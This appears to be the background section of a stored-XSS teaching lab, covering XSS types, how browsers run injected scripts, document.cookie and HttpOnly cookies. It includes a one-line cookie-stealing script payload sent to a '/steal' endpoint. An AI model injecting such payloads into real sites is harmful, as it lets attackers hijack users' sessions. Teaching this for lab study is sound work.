# Background

## Stored vs Reflected XSS

| Type | Where the payload lives | Who triggers it |
|------|------------------------|-----------------|
| Stored (Persistent) | Server-side storage (database, memory) | Any visitor who loads the page |
| Reflected | URL parameter or form field | The user who clicks a crafted link |
| DOM-based | JavaScript reads from the URL | The user's own browser |

This lab demonstrates stored XSS. The comment you post persists in server memory and is served to every subsequent visitor, including the admin bot.

## How the Browser Processes HTML

When a browser receives:

```html
<div>Hello, world</div>
```

It renders text. When it receives:

```html
<div><script>fetch('/steal?c='+document.cookie)</script></div>
```

It executes JavaScript. The browser trusts any script that appears in the HTML document, regardless of where it came from.

## document.cookie

`document.cookie` is a JavaScript property that returns all non-HttpOnly cookies for the current page as a single string:

```
session=abc123; theme=dark
```

An XSS payload can read this string and send it to an attacker-controlled endpoint.

## HttpOnly Cookies

Cookies marked `HttpOnly` are not visible to JavaScript. If the admin cookie were HttpOnly, the payload above would only capture non-HttpOnly cookies. In this lab the flag cookie is not HttpOnly, which is what makes the attack possible.
